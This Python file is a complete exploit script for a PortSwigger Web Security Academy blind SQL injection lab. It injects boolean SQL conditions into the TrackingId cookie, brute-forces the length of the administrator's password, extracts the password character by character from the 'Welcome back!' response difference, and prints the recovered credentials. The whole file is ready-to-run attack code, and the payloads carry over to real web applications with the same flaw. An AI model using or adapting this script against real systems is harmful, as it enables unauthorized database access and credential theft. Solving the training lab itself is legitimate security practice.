import requests
import string
import re # Used to extract hostname and lab ID from the URL (though not explicitly used in this version, good for potential enhancements)

# --- Configuration ---
# Username is fixed
USERNAME = "administrator"
# Maximum length to check for the password
MAX_PASSWORD_LENGTH_CHECK = 50
# Possible characters in the password
POSSIBLE_CHARS = string.ascii_lowercase + string.digits # 'abcdefghijklmnopqrstuvwxyz0123456789'
# Request timeout in seconds
REQUEST_TIMEOUT = 10
# String indicating a successful condition
SUCCESS_INDICATOR = "Welcome back!"

# --- Helper Functions ---
def get_initial_cookies(session, url):
    """
    Accesses the specified URL and retrieves cookies from the initial response.
    Specifically extracts TrackingId and session cookies.
    """
    try:
        response = session.get(url, timeout=REQUEST_TIMEOUT)
        response.raise_for_status() # Raise an exception for HTTP errors
        # print(f"Initial cookies: {session.cookies.get_dict()}") # For debugging
        tracking_id = session.cookies.get("TrackingId")
        session_id = session.cookies.get("session")
        if not tracking_id or not session_id:
            print("Error: Could not retrieve initial TrackingId or session cookie.")
            print("Please check the lab URL and your network connection.")
            print(f"Cookies received: {session.cookies.get_dict()}")
            return None, None
        return tracking_id, session_id
    except requests.exceptions.RequestException as e:
        print(f"Error during initial request to {url}: {e}")
        return None, None

def check_condition(session, url, base_tracking_id, session_id, payload_condition):
    """
    Sends a request with the specified payload condition included in the TrackingId
    and checks if the response contains the success indicator string.
    """
    # Construct the SQL injection payload
    # Starts with a single quote, followed by the condition, and ends with a comment
    injected_tracking_id = f"{base_tracking_id}' {payload_condition} -- "

    cookies = {
        "TrackingId": injected_tracking_id,
        "session": session_id
    }

    try:
        response = session.get(url, cookies=cookies, timeout=REQUEST_TIMEOUT)
        response.raise_for_status() # Raise an exception for HTTP errors
        return SUCCESS_INDICATOR in response.text
    except requests.exceptions.RequestException as e:
        print(f"  [!] Request failed for condition '{payload_condition}': {e}")
        return False # Treat as condition not met on error

# --- Main Logic ---
if __name__ == "__main__":
    print("--- PortSwigger Lab: Blind SQL Injection with Conditional Responses Exploit ---")

    # 1. Get the Lab URL as input
    target_url = input("Enter the Lab URL (e.g., https://0a....web-security-academy.net/): ").strip()
    if not target_url.endswith('/'):
        target_url += '/' # Add a trailing / to the URL if not present

    # Create a requests session (for automatic cookie management)
    s = requests.Session()

    # Proxy settings (if you want to inspect requests with Burp Suite, etc.)
    # proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}
    # s.proxies.update(proxies)
    # s.verify = False # Disable SSL certificate verification (e.g., for Burp's certificate)

    print(f"\n[+] Target URL set to: {target_url}")

    # Make an initial request to get the base TrackingId and session cookie
    print("[+] Attempting to retrieve initial cookies...")
    base_tracking_id, session_id = get_initial_cookies(s, target_url)

    if not base_tracking_id or not session_id:
        print("[-] Exploit aborted due to failure in retrieving initial cookies.")
        exit()

    print(f"[+] Initial TrackingId: {base_tracking_id}")
    print(f"[+] Initial session ID: {session_id}")

    # 2. Determine the password length
    print(f"\n[+] Determining password length for user '{USERNAME}'...")
    password_length = -1
    for length_check in range(1, MAX_PASSWORD_LENGTH_CHECK + 1):
        print(f"  [*] Checking length: {length_check}", end='\r')
        # SQL Payload condition: AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)=<length_check> LIMIT 1)='a'
        # LIMIT 1 might be unnecessary or different depending on the database type. PortSwigger labs often use PostgreSQL.
        # For PostgreSQL, LIMIT 1 is effective to ensure the subquery returns a single row.
        # If the condition is true, 'a'='a' results, making the overall expression true.
        condition = f"AND (SELECT 'a' FROM users WHERE username='{USERNAME}' AND LENGTH(password)={length_check} LIMIT 1)='a'"

        if check_condition(s, target_url, base_tracking_id, session_id, condition):
            password_length = length_check
            print(f"\n  [+] Password length found: {password_length}")
            break
        if length_check == MAX_PASSWORD_LENGTH_CHECK:
            print(f"\n  [-] Could not determine password length up to {MAX_PASSWORD_LENGTH_CHECK} characters.")
            print("      Please check the lab, your connection, or the SQL payload logic.")
            exit()

    if password_length == -1:
        print("[-] Exploit aborted. Password length not found.")
        exit()

    # 3. Extract each character of the password
    print(f"\n[+] Extracting password for user '{USERNAME}' (length: {password_length})...")
    extracted_password_chars = [""] * password_length # List to store the extracted characters

    for p_position in range(1, password_length + 1):
        found_char_for_position = False
        for char_to_guess in POSSIBLE_CHARS:
            print(f"  [*] Position: {p_position}, Trying char: '{char_to_guess}'", end='\r')
            # SQL Payload condition: AND (SELECT SUBSTRING(password,<p_position>,1) FROM users WHERE username='administrator' LIMIT 1)='<char_to_guess>'
            # SUBSTRING(string, start, length) is available in many databases.
            condition = f"AND (SELECT SUBSTRING(password,{p_position},1) FROM users WHERE username='{USERNAME}' LIMIT 1)='{char_to_guess}'"

            if check_condition(s, target_url, base_tracking_id, session_id, condition):
                extracted_password_chars[p_position-1] = char_to_guess
                print(f"  [+] Position {p_position}: Found char '{char_to_guess}'" + " "*20) # Pad with spaces to clear the previous line's output
                found_char_for_position = True
                break # Character for this position found, move to the next position

        if not found_char_for_position:
            print(f"\n  [-] Could not find character for position {p_position}.")
            print("      Something went wrong. Check the lab or the script logic.")
            # Here you can decide whether to stop processing or treat as an unknown character
            # For this script, it continues, but error handling should ideally be enhanced
            extracted_password_chars[p_position-1] = "?" # Mark as an unknown character

    # 4. Output the results
    final_password = "".join(extracted_password_chars)
    print("\n--- Exploit Finished ---")
    print(f"[+] Username: {USERNAME}")
    print(f"[+] Password: {final_password}")

    if "?" in final_password:
        print("\n[!] Warning: Some characters could not be determined and are marked with '?'.")
        print("    Please review the output and potentially adjust POSSIBLE_CHARS or script logic if needed.")